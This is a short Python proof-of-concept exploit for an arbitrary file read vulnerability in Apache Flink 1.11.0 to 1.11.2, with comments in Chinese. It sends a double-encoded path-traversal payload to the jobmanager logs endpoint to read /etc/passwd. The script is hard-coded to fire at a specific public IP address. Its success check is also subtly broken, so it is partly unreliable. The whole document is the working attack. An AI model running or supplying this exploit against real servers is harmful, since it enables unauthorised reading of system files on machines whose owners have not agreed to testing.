import requests

'''
影响版本
1.11.0
1.11.1
1.11.2
'''
class POC:
	def __init__(self,target):
		self.target=target

	def verify(self,target):
		headers={
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36'
		}
		payload = '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'
		if 'http' not in target:
			target='http://'+target+'/'
		url=target+payload
		try:
			res=requests.get(url=url,headers=headers).text
			if 'root' and 'flink' in res:
				print('[+] 发现目标flink任意文件读取')
		except:
			pass
		print('[*]1 poc done')
	def atack(self):
		print('[*]1 poc start')
		self.verify(self.target)


target='http://54.187.112.182:8081/'
p=POC(target)
p.atack()
